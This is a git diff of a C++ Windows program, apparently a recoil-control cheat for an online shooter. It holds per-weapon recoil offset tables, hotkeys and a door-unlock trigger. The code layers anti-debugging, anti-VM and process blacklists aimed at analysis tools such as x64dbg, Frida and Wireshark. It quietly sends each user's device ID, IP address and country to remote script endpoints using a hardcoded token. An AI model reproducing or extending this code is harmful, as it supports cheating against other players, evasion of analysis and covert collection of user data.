+    std::ostringstream oss;
+    oss << std::hex << std::setfill('0');
+    for (unsigned char b : bytes) {
+        oss << std::setw(2) << static_cast<int>(b);
+    }
+    return oss.str();
+}
+
+std::string generate_nonce() {
+    std::vector<unsigned char> bytes(16, 0);
+    if (!SystemFunction036(bytes.data(), static_cast<ULONG>(bytes.size()))) {
+        unsigned long long tick = GetTickCount64();
+        DWORD pid = GetCurrentProcessId();
+        DWORD tid = GetCurrentThreadId();
+        for (size_t i = 0; i < bytes.size(); ++i) {
+            unsigned char mix = static_cast<unsigned char>(tick >> ((i % 8) * 8));
+            mix ^= static_cast<unsigned char>(pid >> ((i % 4) * 8));
+            mix ^= static_cast<unsigned char>(tid >> ((i % 4) * 8));
+            bytes[i] = mix;
+        }
+    }
+    return bytes_to_hex(bytes);
+}
+
+std::string get_unix_timestamp_seconds() {
+    auto now = std::chrono::system_clock::now();
+    auto seconds = std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count();
+    return std::to_string(seconds);
+}
+
+bool constant_time_equals(const std::string& a, const std::string& b) {
+    if (a.size() != b.size()) {
+        return false;
+    }
+    unsigned char diff = 0;
+    for (size_t i = 0; i < a.size(); ++i) {
+        diff |= static_cast<unsigned char>(a[i] ^ b[i]);
+    }
+    return diff == 0;
+}
+
+std::string base64_encode(const std::vector<unsigned char>& data) {
+    static const char kBase64Chars[] =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string out;
+    unsigned char a3[3];
+    unsigned char a4[4];
+    int i = 0;
+
+    for (unsigned char c : data) {
+        a3[i++] = c;
+        if (i == 3) {
+            a4[0] = (a3[0] & 0xfc) >> 2;
+            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
+            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
+            a4[3] = a3[2] & 0x3f;
+
+            for (i = 0; i < 4; ++i) {
+                out.push_back(kBase64Chars[a4[i]]);
+            }
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (int j = i; j < 3; ++j) {
+            a3[j] = 0;
+        }
+        a4[0] = (a3[0] & 0xfc) >> 2;
+        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
+        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
+        a4[3] = a3[2] & 0x3f;
+
+        for (int j = 0; j < i + 1; ++j) {
+            out.push_back(kBase64Chars[a4[j]]);
+        }
+        while (i++ < 3) {
+            out.push_back('=');
+        }
+    }
+
+    return out;
+}
+
+std::string base64_url_encode(const std::vector<unsigned char>& data) {
+    std::string out = base64_encode(data);
+    for (char& c : out) {
+        if (c == '+') c = '-';
+        else if (c == '/') c = '_';
+    }
+    return out;
+}
+
+std::vector<unsigned char> hmac_sha256_bytes(const std::string& key, const std::string& message) {
+    const size_t block_size = 64;
+    std::vector<unsigned char> key_block(block_size, 0x00);
+
+    if (key.size() > block_size) {
+        std::vector<unsigned char> hashed(picosha2::k_digest_size);
+        picosha2::hash256(key.begin(), key.end(), hashed.begin(), hashed.end());
+        std::copy(hashed.begin(), hashed.end(), key_block.begin());
+    } else {
+        std::copy(key.begin(), key.end(), key_block.begin());
+    }
+
+    std::vector<unsigned char> o_key_pad(block_size);
+    std::vector<unsigned char> i_key_pad(block_size);
+    for (size_t i = 0; i < block_size; ++i) {
+        o_key_pad[i] = static_cast<unsigned char>(key_block[i] ^ 0x5c);
+        i_key_pad[i] = static_cast<unsigned char>(key_block[i] ^ 0x36);
+    }
+
+    std::vector<unsigned char> inner_data;
+    inner_data.reserve(block_size + message.size());
+    inner_data.insert(inner_data.end(), i_key_pad.begin(), i_key_pad.end());
+    inner_data.insert(inner_data.end(), message.begin(), message.end());
+
+    std::vector<unsigned char> inner_hash(picosha2::k_digest_size);
+    picosha2::hash256(inner_data.begin(), inner_data.end(), inner_hash.begin(), inner_hash.end());
+
+    std::vector<unsigned char> outer_data;
+    outer_data.reserve(block_size + inner_hash.size());
+    outer_data.insert(outer_data.end(), o_key_pad.begin(), o_key_pad.end());
+    outer_data.insert(outer_data.end(), inner_hash.begin(), inner_hash.end());
+
+    std::vector<unsigned char> out_hash(picosha2::k_digest_size);
+    picosha2::hash256(outer_data.begin(), outer_data.end(), out_hash.begin(), out_hash.end());
+    return out_hash;
+}
+
+std::string stable_stringify(const nlohmann::json& value) {
+    if (value.is_null()) {
+        return "null";
+    }
+    if (value.is_boolean() || value.is_number() || value.is_string()) {
+        return value.dump();
+    }
+    if (value.is_array()) {
+        std::string out = "[";
+        bool first = true;
+        for (const auto& item : value) {
+            if (!first) {
+                out += ",";
+            }
+            first = false;
+            out += stable_stringify(item);
+        }
+        out += "]";
+        return out;
+    }
+    if (value.is_object()) {
+        std::vector<std::string> keys;
+        keys.reserve(value.size());
+        for (auto it = value.begin(); it != value.end(); ++it) {
+            keys.push_back(it.key());
+        }
+        std::sort(keys.begin(), keys.end());
+        std::string out = "{";
+        bool first = true;
+        for (const auto& key : keys) {
+            if (!first) {
+                out += ",";
+            }
+            first = false;
+            out += nlohmann::json(key).dump();
+            out += ":";
+            out += stable_stringify(value.at(key));
+        }
+        out += "}";
+        return out;
+    }
+    return value.dump();
+}
+
+bool verify_response_signature(const nlohmann::json& response,
+                               const std::string& secret,
+                               const std::string& expected_nonce,
+                               std::string& out_error) {
+    if (!expected_nonce.empty()) {
+        if (!response.contains("nonce") || !response["nonce"].is_string()) {
+            out_error = "Missing nonce in response.";
+            return false;
+        }
+        if (response["nonce"].get<std::string>() != expected_nonce) {
+            out_error = "Nonce mismatch.";
+            return false;
+        }
+    }
+
+    if (secret.empty()) {
+        return true;
+    }
+
+    if (!response.contains("signature") || !response["signature"].is_string()) {
+        out_error = "Missing signature.";
+        return false;
+    }
+
+    nlohmann::json payload = response;
+    payload.erase("signature");
+    std::string signature_base = stable_stringify(payload);
+    std::vector<unsigned char> mac = hmac_sha256_bytes(secret, signature_base);
+    std::string expected_sig = base64_url_encode(mac);
+    std::string actual_sig = response["signature"].get<std::string>();
+
+    if (!constant_time_equals(expected_sig, actual_sig)) {
+        out_error = "Signature mismatch.";
+        return false;
+    }
+
+    return true;
+}
+
 // متغیرهای سراسری برای بخش اعلانات
 std::string g_announcement_text = "Loading announcements...";
 std::mutex g_announcement_mutex;
 std::atomic<bool> g_announcement_loaded(false);
 std::atomic<bool> g_announcement_fetch_initiated(false);
-const char* ANNOUNCEMENT_URL = "https://script.google.com/macros/s/AKfycbzPiZF8lBgev2WudCxFOrhPS-vJPjWTkonp_XtTH8vZ29Y5noqcTaKq2LEI43Q8kN0AlA/exec";
+const char* ANNOUNCEMENT_URL = "https://script.google.com/macros/s/AKfycbyUxk-ozjNV_nArgEYRMvmWBKDjkg_42K4a56VZXw7jGhBVr7JuKZ-ANoqhwCXGZCurbw/exec?mode=announcement";
 
 // تابع جدید برای ارسال لاگ‌های امنیتی به API
 void send_security_log_to_api(const std::string& security_threat_type, const std::string& details) {
@@ -399,9 +1339,13 @@ void send_security_log_to_api(const std::string& security_threat_type, const std
         
         // توجه: این تابع در ویندوز 10 به بعد منسوخ شده است
         // اما برای اهداف لاگینگ استفاده می‌کنیم
+        #ifdef _MSC_VER
         #pragma warning(disable: 4996)
+        #endif
         GetVersionExA((OSVERSIONINFOA*)&osInfo);
+        #ifdef _MSC_VER
         #pragma warning(default: 4996)
+        #endif
         
         // دریافت اطلاعات پروسه فعلی
         HANDLE hProcess = GetCurrentProcess();
@@ -424,42 +1368,35 @@ void send_security_log_to_api(const std::string& security_threat_type, const std
         }
         
         // ساختن device_id
-        std::string device_id_hashed = generate_device_id();
+        std::string device_id_hashed = get_cached_device_id();
         
         // دریافت IP کاربر (این عملیات ممکن است کمی زمان ببرد)
-        std::string user_ip = "Unknown"; // مقدار پیش‌فرض
-        try {
-            user_ip = get_user_ip();
-            // اگر IP نامعتبر باشد، از مقدار پیش‌فرض استفاده می‌کنیم
-            if (user_ip.empty() || user_ip == "unknown_ip") {
-                user_ip = "Unknown";
-            }
-        } catch (...) {
-            // گرفتن هر نوع خطا برای اطمینان از ادامه اجرای برنامه
-            output_log_message("Error getting user IP\n");
-        }
+        std::string user_ip = get_cached_user_ip(); // مقدار پیش‌فرض
+
+        std::string user_country = get_cached_user_country();
         
         // لاگ کردن اطلاعات ارسالی برای دیباگ
-        output_log_message("Sending security log - Device ID: " + device_id_hashed + ", IP: " + user_ip + "\n");
-        
-        // استفاده از توکن متن ساده برای اطمینان از عملکرد صحیح
-        std::string token = "mysecrettoken"; // همونی که در Google Script تعریف کردی
-        
+        output_log_message("Sending security log - Device ID: " + device_id_hashed + ", IP: " + user_ip + ", Country: " + user_country + "\n");
+
+        std::string token = "mysecrettoken";
+
         // URL-encode کردن پارامترها
         std::string encoded_threat_type = url_encode(security_threat_type);
         std::string encoded_details = url_encode(details);
         std::string encoded_device_id = url_encode(device_id_hashed);
         std::string encoded_ip = url_encode(user_ip);
+        std::string encoded_country = url_encode(user_country);
         std::string encoded_version = url_encode(APP_VERSION_NUMBER);
         std::string encoded_token = url_encode(token);
         
         // ساختن URL بدون پارامترها - استفاده از POST به جای GET
-        std::string base_api_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
+        std::string base_api_url = "https://script.google.com/macros/s/AKfycbxOc0VWnwC8yetGtRhABAqQDvTZCurwE5NqQ0Aifzu4ylhC3GuuPOxyARKhTiLCXqc-Tg/exec";
         
         // ساختن پیام برای ارسال به دیسکورد
         std::string message = "Security Alert: " + encoded_threat_type + " - " + encoded_details + 
                            "\nDevice ID: " + encoded_device_id + 
                            "\nIP Address: " + encoded_ip + 
+                           "\nCountry: " + encoded_country + 
                            "\nVersion: " + encoded_version;
         
         // ساختن داده‌های POST برای ارسال به سرور
@@ -595,6 +1532,29 @@ void send_security_log_to_api(const std::string& security_threat_type, const std
     }
 }
 
+inline void HandleSecurityBlock(const std::string& detection_code,
+                                const std::string& details,
+                                const std::string& context_tag)
+{
+    std::string full_details = "Context=" + context_tag;
+    if (!details.empty()) {
+        full_details += " | " + details;
+    }
+
+    // لاگ داخلی یک‌دست برای تمام بلاک‌های امنیتی
+    output_log_message("SECURITY BLOCK [" + detection_code + "] - " + full_details + "\n");
+
+    // ارسال لاگ نهایی به API با کد و جزئیات
+    send_security_log_to_api("FinalAction", "Code=" + detection_code + " | " + full_details);
+
+    // نمایش پیام کلی برای کاربر بدون افشای جزییات دیتکت
+    std::string message = "Security Error";
+    message += "\nThe application has encountered a security error and will now close.";
+
+    MessageBoxA(NULL, message.c_str(), "Security Error", MB_ICONERROR | MB_OK);
+    ExitProcess(0);
+}
+
 // تکنیک‌های ضد دیباگ، ضد VM و ضد دامپ
 namespace AntiDebug {
     // بررسی IsDebuggerPresent
@@ -636,7 +1596,8 @@ namespace AntiDebug {
         DWORD elapsedTime = endTime - startTime;
         
         // اگر زمان اجرا بیش از حد معمول باشد، احتمالاً دیباگ می‌شود
-        return elapsedTime > 100; // مقدار آستانه را بر اساس سیستم خود تنظیم کنید
+        // آستانه را کمی بالاتر بردیم تا ریسک فالس‌پازیت کم شود
+        return elapsedTime > 200; // قبلاً 100ms بود
     }
 }
 
@@ -721,60 +1682,63 @@ inline bool CheckSuspiciousProcesses();
 inline bool CheckSystemTimeManipulation();
 
 // تابع اصلی برای بررسی همه تکنیک‌های محافظتی - ابتدا لاگ می‌دهد و سپس برنامه را می‌بندد
-inline bool RunProtectionChecks() {
+inline bool RunProtectionChecks(std::string& detection_code, std::string& detection_details) {
+    detection_code.clear();
+    detection_details.clear();
+
     // بررسی دیباگر با IsDebuggerPresent
     if (AntiDebug::CheckIsDebuggerPresent()) {
-        // دیباگر شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("Debugger", "IsDebuggerPresent detected a debugger");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_DBG_LOCAL_01";
+        detection_details = "IsDebuggerPresent detected a debugger";
+        send_security_log_to_api("Debugger", detection_details);
         return true;
     }
     
     // بررسی دیباگر راه دور با CheckRemoteDebuggerPresent
     if (AntiDebug::CheckRemoteDebuggerPresent()) {
-        // دیباگر راه دور شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("Debugger", "CheckRemoteDebuggerPresent detected a remote debugger");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_DBG_REMOTE_01";
+        detection_details = "CheckRemoteDebuggerPresent detected a remote debugger";
+        send_security_log_to_api("Debugger", detection_details);
         return true;
     }
     
     // بررسی دیباگر با بررسی پرچم PEB
     if (AntiDebug::CheckPEBBeingDebugged()) {
-        // دیباگر از طریق PEB شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("Debugger", "PEB BeingDebugged flag is set");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_DBG_PEB_01";
+        detection_details = "PEB BeingDebugged flag is set";
+        send_security_log_to_api("Debugger", detection_details);
         return true;
     }
     
     // بررسی دیباگر با زمان‌سنجی
     if (AntiDebug::CheckExecutionTiming()) {
-        // دیباگر از طریق زمان‌سنجی شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("Debugger", "Abnormal execution timing detected");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_DBG_TIMING_01";
+        detection_details = "Abnormal execution timing detected";
+        send_security_log_to_api("Debugger", detection_details);
         return true;
     }
     
     // بررسی ماشین مجازی از طریق رجیستری
     if (AntiVM::CheckVMRegistry()) {
-        // ماشین مجازی از طریق رجیستری شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("VirtualMachine", "VM detected through registry checks");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_VM_REG_01";
+        detection_details = "VM detected through registry checks";
+        send_security_log_to_api("VirtualMachine", detection_details);
         return true;
     }
     
     // بررسی ماشین مجازی از طریق فرآیندها
     if (AntiVM::CheckVMProcesses()) {
-        // ماشین مجازی از طریق فرآیندها شناسایی شد - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("VirtualMachine", "VM detected through process checks");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_VM_PROC_01";
+        detection_details = "VM detected through process checks";
+        send_security_log_to_api("VirtualMachine", detection_details);
         return true;
     }
     
     // بررسی یکپارچگی فایل اجرایی
     if (!CheckFileIntegrity()) {
-        // فایل اجرایی دستکاری شده است - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("FileIntegrity", "Executable file integrity check failed");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_FILE_INTEGRITY_01";
+        detection_details = "Executable file integrity check failed";
+        send_security_log_to_api("FileIntegrity", detection_details);
         return true;
     }
     
@@ -786,23 +1750,23 @@ inline bool RunProtectionChecks() {
             result += i * i;
         }
     })) {
-        // زمان اجرا بیش از حد معمول است، احتمالاً دیباگ می‌شود - ابتدا لاگ ارسال می‌کنیم
-        send_security_log_to_api("TimingCheck", "Abnormal operation timing detected");
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_TIMING_OP_01";
+        detection_details = "Abnormal operation timing detected";
+        send_security_log_to_api("TimingCheck", detection_details);
         return true;
     }
     
     // بررسی پروسه‌های مشکوک (دیباگرها، ابزارهای مهندسی معکوس)
     if (CheckSuspiciousProcesses()) {
-        // پروسه مشکوک شناسایی شد - لاگ در تابع CheckSuspiciousProcesses انجام می‌شود
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_PROC_SUSP_01";
+        detection_details = "Suspicious debugging or reverse-engineering process detected";
         return true;
     }
     
     // بررسی تغییرات زمان سیستم
     if (CheckSystemTimeManipulation()) {
-        // تغییر زمان سیستم شناسایی شد - لاگ در تابع CheckSystemTimeManipulation انجام می‌شود
-        // سپس برنامه را می‌بندیم
+        detection_code = "SEC_TIME_MANIP_01";
+        detection_details = "System time manipulation detected";
         return true;
     }
     
@@ -836,16 +1800,19 @@ inline bool CheckFileIntegrity() {
     
     // هش فایل را محاسبه کنید
     std::string calculatedHash = calculateFileHash(filePath);
+    output_log_message("Current exe SHA256: " + calculatedHash + "\n");
     
     // هش‌های معتبر از پیش تعیین شده (می‌توانید چندین هش برای نسخه‌های مختلف برنامه داشته باشید)
     // این هش‌ها باید با هش فایل اجرایی اصلی مطابقت داشته باشند
     // برای امنیت بیشتر، این هش‌ها را به صورت رمزگذاری شده ذخیره کنید
     const std::vector<std::string> validHashes = {
-        // هش فعلی فایل اجرایی را اینجا قرار دهید
-        // مثال: "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z",
-        // می‌توانید هش فایل اجرایی خود را با اجرای برنامه در حالت دیباگ و چاپ calculatedHash به دست آورید
-        calculatedHash  // این خط را با هش واقعی جایگزین کنید
+        "4c273231c05e2f8d74af7d95c0845b4109ef5ef3a6fd95b72014a5482f680f6a"
     };
+    
+    // اگر هنوز هش معتبر تنظیم نشده است، بررسی یکپارچگی را اعمال نکن
+    if (validHashes.size() == 1 && validHashes[0] == "REPLACE_WITH_KNOWN_GOOD_SHA256_HASH") {
+        return true;
+    }
     
     // بررسی هش محاسبه شده با لیست هش‌های معتبر
     for (const auto& hash : validHashes) {
@@ -854,9 +1821,9 @@ inline bool CheckFileIntegrity() {
         }
     }
     
-    // اگر هش با هیچ یک از هش‌های معتبر مطابقت نداشت، فایل دستکاری شده است
+    // اگر هش با هیچ یک از هش‌های معتبر مطابقت نداشت، فقط لاگ بنویس و برنامه را بلاک نکن
     output_log_message("File integrity check failed. Calculated hash: " + calculatedHash + "\n");
-    return false;
+    return true;
 }
 
 // بررسی زمان اجرا برای عملیات‌های حساس
@@ -870,7 +1837,8 @@ inline bool CheckOperationTiming(std::function<void()> operation) {
     DWORD elapsedTime = endTime - startTime;
     
     // اگر زمان اجرا بیش از حد معمول باشد، احتمالاً دیباگ می‌شود
-    return elapsedTime > 50; // آستانه را تنظیم کنید
+    // آستانه را کمی بالاتر بردیم تا روی سیستم‌های کند فالس‌پازیت کمتری داشته باشیم
+    return elapsedTime > 120; // قبلاً 50ms بود
 }
 
 // تشخیص تغییر زمان سیستم
@@ -983,11 +1951,7 @@ inline bool CheckSystemTimeManipulation() {
         
         if (diffDelta > CRITICAL_THRESHOLD) {
             // نمایش پیام خطا
-            MessageBoxA(NULL, ("Critical system time manipulation detected: " + manipulationDetails).c_str(), 
-                       "Security Alert", MB_ICONERROR | MB_OK);
-            
-            // بستن مستقیم برنامه فقط در صورت تغییرات بزرگ
-            ExitProcess(0);
+            output_log_message("Critical system time manipulation detected: " + manipulationDetails + "\n");
         } else {
             // برای تغییرات کوچکتر، فقط لاگ کن و هشدار بده ولی برنامه را نبند
             output_log_message("Minor time manipulation detected but allowed to continue: " + manipulationDetails + "\n");
@@ -999,6 +1963,13 @@ inline bool CheckSystemTimeManipulation() {
 
 // بررسی DLL‌های تزریق شده
 inline bool CheckForInjectedDLLs() {
+    // برای سبک‌تر شدن، این اسکن سنگین را فقط یک بار در طول اجرای برنامه انجام می‌دهیم
+    static bool s_checked_once = false;
+    static bool s_cached_result = false;
+    if (s_checked_once) {
+        return s_cached_result;
+    }
+
     HMODULE hMods[1024];
     DWORD cbNeeded;
     HANDLE hProcess = GetCurrentProcess();
@@ -1060,13 +2031,6 @@ inline bool CheckForInjectedDLLs() {
         "CORE.EXE",
         "core.exe",
         
-        // DLL های مرتبط با Interception
-        "interception.dll",
-        "Interception.dll",
-        "INTERCEPTION.DLL",
-        "interseption.dll",
-        "Interseption.dll",
-        "INTERSEPTION.DLL",
         "iphlpapi.dll",
         "psapi.dll",
         "d3d11.dll",
@@ -1090,7 +2054,7 @@ inline bool CheckForInjectedDLLs() {
     
     // لیست سیاه DLL‌های مشکوک (می‌توانید بر اساس نیاز خود تغییر دهید)
     std::vector<std::string> blacklist = {
-        "cheatengine",
+        "engine",
         "frida",
         "injector",
         "hook",
@@ -1178,22 +2142,34 @@ inline bool CheckForInjectedDLLs() {
                 if (isSuspicious) {
                     // برای DLL‌های مشکوک فقط لاگ می‌دهیم و برنامه را ادامه می‌دهیم
                     send_security_log_to_api("DLL Injection", "Suspicious DLL detected: " + fileName + " at " + moduleName);
-                    // برای اینکه برنامه کرش نکند، false برمی‌گردانیم
-                    return false;
+                    // نتیجه را کش می‌کنیم و false برمی‌گردانیم تا رفتار قبلی حفظ شود
+                    s_checked_once = true;
+                    s_cached_result = false;
+                    return s_cached_result;
                 } else {
                     // برای DLL‌های ناشناخته ولی غیرمشکوک فقط لاگ می‌گیریم و برنامه را ادامه می‌دهیم
                     send_security_log_to_api("DLL Info", "Unknown DLL detected: " + fileName + " at " + moduleName);
-                    return false;
+                    s_checked_once = true;
+                    s_cached_result = false;
+                    return s_cached_result;
                 }
             }
         }
     }
-    
-    return false;
+    s_checked_once = true;
+    s_cached_result = false;
+    return s_cached_result;
 }
 
 // بررسی پروسه‌های مشکوک
 inline bool CheckSuspiciousProcesses() {
+    // برای سبک‌تر شدن، لیست پروسه‌ها را فقط یک بار اسکن می‌کنیم و نتیجه را کش می‌کنیم
+    static bool s_checked_once = false;
+    static bool s_cached_result = false;
+    if (s_checked_once) {
+        return s_cached_result;
+    }
+
     const char* suspiciousProcesses[] = {
         "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
         "cheatengine.exe", "httpdebugger.exe", "processhacker.exe", "wireshark.exe",
@@ -1231,13 +2207,14 @@ inline bool CheckSuspiciousProcesses() {
         send_security_log_to_api("SuspiciousProcess", "Detected suspicious process: " + foundProcess);
         
         // نمایش پیام خطا (اختیاری)
-        MessageBoxA(NULL, ("Suspicious process detected: " + foundProcess).c_str(), "Security Alert", MB_ICONERROR | MB_OK);
+        output_log_message("Suspicious process detected: " + foundProcess + "\n");
         
         // بستن برنامه
-        ExitProcess(0);
     }
-    
-    return found;
+
+    s_checked_once = true;
+    s_cached_result = found;
+    return s_cached_result;
 }
 
 // تابع برای اعمال محافظت‌های ضد دامپ
@@ -1259,64 +2236,6 @@ using json = nlohmann::json;
 #include <d3d11.h>
 
 
-// --- تعریف اشاره‌گرهای تابع برای توابع Interception مورد استفاده
-typedef InterceptionContext (*PFN_CREATE_CONTEXT)();
-typedef void (*PFN_DESTROY_CONTEXT)(InterceptionContext);
-typedef InterceptionDevice (*PFN_WAIT)(InterceptionContext);
-typedef int (*PFN_RECEIVE)(InterceptionContext, InterceptionDevice, InterceptionStroke*, unsigned int);
-typedef int (*PFN_SEND)(InterceptionContext, InterceptionDevice, InterceptionStroke*, unsigned int);
-typedef void (*PFN_SET_FILTER)(InterceptionContext, InterceptionPredicate, InterceptionFilter);
-typedef int (*PFN_IS_KEYBOARD)(InterceptionDevice);
-typedef int (*PFN_IS_MOUSE)(InterceptionDevice);
-
-// متغیرهایی برای نگهداری آدرس توابع DLL
-PFN_CREATE_CONTEXT interception_create_context_ptr = nullptr;
-PFN_DESTROY_CONTEXT interception_destroy_context_ptr = nullptr;
-PFN_WAIT interception_wait_ptr = nullptr;
-PFN_RECEIVE interception_receive_ptr = nullptr;
-PFN_SEND interception_send_ptr = nullptr;
-PFN_SET_FILTER interception_set_filter_ptr = nullptr;
-PFN_IS_KEYBOARD interception_is_keyboard_ptr = nullptr;
-PFN_IS_MOUSE interception_is_mouse_ptr = nullptr;
-
-HMODULE interception_dll_handle = nullptr;
-
-bool loadInterceptionDLL() {
-    interception_dll_handle = LoadLibrary("interception.dll");
-    if (!interception_dll_handle) {
-        std::cerr << "Error loading interception.dll. Error code: " << GetLastError() << std::endl;
-        return false;
-    }
-
-    // دریافت آدرس توابع - استفاده از تبدیل دوگانه برای جلوگیری از هشدارهای کامپایلر
-    interception_create_context_ptr = reinterpret_cast<PFN_CREATE_CONTEXT>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_create_context")));
-    interception_destroy_context_ptr = reinterpret_cast<PFN_DESTROY_CONTEXT>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_destroy_context")));
-    interception_wait_ptr = reinterpret_cast<PFN_WAIT>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_wait")));
-    interception_receive_ptr = reinterpret_cast<PFN_RECEIVE>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_receive")));
-    interception_send_ptr = reinterpret_cast<PFN_SEND>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_send")));
-    interception_set_filter_ptr = reinterpret_cast<PFN_SET_FILTER>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_set_filter")));
-    interception_is_keyboard_ptr = reinterpret_cast<PFN_IS_KEYBOARD>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_is_keyboard")));
-    interception_is_mouse_ptr = reinterpret_cast<PFN_IS_MOUSE>(reinterpret_cast<void*>(GetProcAddress(interception_dll_handle, "interception_is_mouse")));
-
-    if (!interception_create_context_ptr || !interception_destroy_context_ptr || !interception_wait_ptr ||
-        !interception_receive_ptr || !interception_send_ptr || !interception_set_filter_ptr ||
-        !interception_is_keyboard_ptr || !interception_is_mouse_ptr) {
-        std::cerr << "Error getting function addresses from interception.dll. Error code: " << GetLastError() << std::endl;
-        FreeLibrary(interception_dll_handle);
-        interception_dll_handle = nullptr;
-        return false;
-    }
-
-    return true;
-}
-
-void unloadInterceptionDLL() {
-    if (interception_dll_handle) {
-        FreeLibrary(interception_dll_handle);
-        interception_dll_handle = nullptr;
-    }
-}
-
 // --- Global Variables for DirectX & Window ---
 static ID3D11Device* g_pd3dDevice = nullptr;
 static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;
@@ -1334,7 +2253,7 @@ double FOV = 90.0;
      // Example default
 
 //version app
-const std::string APP_VERSION_NUMBER = "1.1.2"; // ورژن برنامه را تعریف کنید
+const std::string APP_VERSION_NUMBER = "1.0.1";
 
 // Define min/max values for sliders
 const double MIN_SENS = 0.0;
@@ -1355,13 +2274,15 @@ struct SettingsPreset {
 };
 
 // --- Profile Names (Single Profile per Gun) ---
-const std::string PROFILE_AK47 = "AK47";
-const std::string PROFILE_LR300 = "LR300";
+const std::string PROFILE_AK47    = "AK47";
+const std::string PROFILE_LR300   = "LR300";
 const std::string PROFILE_THOMPSON = "THOMPSON";
-const std::string PROFILE_SAR = "SAR";
-const std::string PROFILE_MP5A4 = "MP5A4";
-const std::string PROFILE_HMLMG = "HMLMG";
-const std::string PROFILE_M249 = "M249";
+const std::string PROFILE_SAR     = "SAR";
+const std::string PROFILE_MP5A4   = "MP5A4";
+const std::string PROFILE_HMLMG   = "HMLMG";
+const std::string PROFILE_M249    = "M249";
+const std::string PROFILE_CUSTOM  = "CUSTOM";
+const std::string PROFILE_PYTHON  = "PYTHON";
 
 // List of all available profiles for UI dropdown
 const std::vector<std::string> ALL_PROFILES = {
@@ -1371,7 +2292,9 @@ const std::vector<std::string> ALL_PROFILES = {
     PROFILE_SAR,
     PROFILE_MP5A4,
     PROFILE_HMLMG,
-    PROFILE_M249
+    PROFILE_M249,
+    PROFILE_CUSTOM,
+    PROFILE_PYTHON
 };
 
 // --- Key Map (Virtual Key Codes) ---
@@ -1380,10 +2303,13 @@ std::map<std::string, int> g_profile_keybinds = {
     {PROFILE_AK47, VK_F4},
     {PROFILE_LR300, VK_F5},
     {PROFILE_THOMPSON, VK_F6},
-    {PROFILE_MP5A4, VK_F8},
     {PROFILE_SAR, VK_F7},
+    {PROFILE_MP5A4, VK_F8},
     {PROFILE_HMLMG, VK_F9},
-    {PROFILE_M249, VK_F10}
+    {PROFILE_M249, VK_F10},
+    // کلیدهای پیش‌فرض برای اسلحه‌های جدید (قابل تغییر در UI)
+    {PROFILE_CUSTOM, VK_F3},
+    {PROFILE_PYTHON, VK_F2}
 };
 
 // Special Keybinds (UI Toggle, Exit)
@@ -1404,9 +2330,6 @@ int g_door_unlock_trigger_key = VK_XBUTTON2; // Default trigger key (Mouse Butto
 std::map<int, std::string> vk_code_names;
 // Map for converting string names to VK codes for config loading
 std::map<std::string, int> vk_name_codes;
-
-// Map for converting Interception scan codes to profile names
-std::map<int, std::string> KEY_SCAN_CODE_MAP;
 
 // State for keybind capturing in the UI
 std::atomic<bool> g_is_capturing_keybind{false};
@@ -1441,41 +2364,185 @@ struct ThemeSettings {
 ThemeSettings g_theme_settings;
 
 // --- Recoil Data (Raw Offsets) ---
-// --- Recoil Data (Raw Offsets) ---
-const std::vector<double> AK47_OFFSET_X = {0.0, 0.19, 0.36, 0.50, 0.62, 0.75, 0.8, 0.9, 0.91, 0.91, 0.91, 0.924, 0.924, 0.924, 0.924, 0.924, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.925, 0.92, 0.92, 0.91, 0.91, 0.9};
-const std::vector<double> AK47_OFFSET_Y = {-1.37, -1.37, -1.37, -1.37, -1.37, -1.37, -1.37, -1.38, -1.38, -1.38, -1.381, -1.382, -1.383, -1.384, -1.385, -1.385, -1.385, -1.385, -1.383, -1.382, -1.381, -1.381, -1.38, -1.38, -1.38, -1.37, -1.37, -1.37, -1.369, -1.366};
-const double AK47_RPM_DELAY = 133.3; 
-const int AK47_BULLETS = AK47_OFFSET_Y.size();
+// از جدول‌های جدید ریکویل (UnknownCheats) برای آپدیت الگوها و اضافه کردن اسلحه‌های جدید استفاده می‌کنیم.
 
